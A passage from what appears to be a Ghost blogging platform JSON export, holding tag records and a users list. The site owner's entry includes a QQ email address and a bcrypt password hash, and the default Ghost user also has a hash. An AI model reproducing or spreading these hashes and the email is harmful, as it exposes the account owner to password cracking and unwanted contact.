jection_head":null,"codeinjection_foot":null,"canonical_url":null,"accent_color":null,"created_at":"2017-01-17T06:09:13.000Z","created_by":"1","updated_at":"2017-01-17T06:09:13.000Z","updated_by":"1"},{"id":"5f48b79fc6057c0001f5d2b8","name":"webgl","slug":"webgl","description":null,"feature_image":null,"parent_id":null,"visibility":"public","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"meta_title":null,"meta_description":null,"codeinjection_head":null,"codeinjection_foot":null,"canonical_url":null,"accent_color":null,"created_at":"2018-05-17T13:00:33.000Z","created_by":"1","updated_at":"2018-05-17T13:00:33.000Z","updated_by":"1"},{"id":"5f48b79fc6057c0001f5d2b9","name":"html","slug":"html","description":null,"feature_image":null,"parent_id":null,"visibility":"public","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"meta_title":null,"meta_description":null,"codeinjection_head":null,"codeinjection_foot":null,"canonical_url":null,"accent_color":null,"created_at":"2017-01-17T06:09:13.000Z","created_by":"1","updated_at":"2017-01-17T06:09:13.000Z","updated_by":"1"}],"users":[{"id":"1","name":"大地瓜","slug":"da","password":"$2a$10$F5anAWiuuYoPVFcMYOL8zOVeXU8sIFWXD/wFn1RHAWgsByKsPH5Pm","email":"353272497@qq.com","profile_image":null,"cover_image":null,"bio":null,"website":null,"location":null,"facebook":null,"twitter":null,"accessibility":null,"status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":"2020-08-28T07:51:39.000Z","created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:51:39.000Z","updated_by":"1"},{"id":"5f48b79dc6057c0001f5d2ab","name":"Ghost","slug":"ghost-user","password":"$2a$10$KY/k89s4h1SzfWqz9Z.gOeFpNpJMYuG1KESq0nMJhsQfWR9FXmqHC","email":"ghost-author@example.com","profile_image":null,"cover_image":null,"bio":"You can delete this user to remove all the welcome posts","website":null,"location":null,"facebook":null,"twitter":null,"accessibility":null,"status":"locked","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":null,"created_at":"2020-08-27T12:23:09.000Z","created_by":"5f48b79dc6057c0001f5d2aa","updated_at":"2020-08-27T12:23:09.000Z","updated_by":"5f48b79dc6057c0001f5d2aa"}],"webhooks":[]}}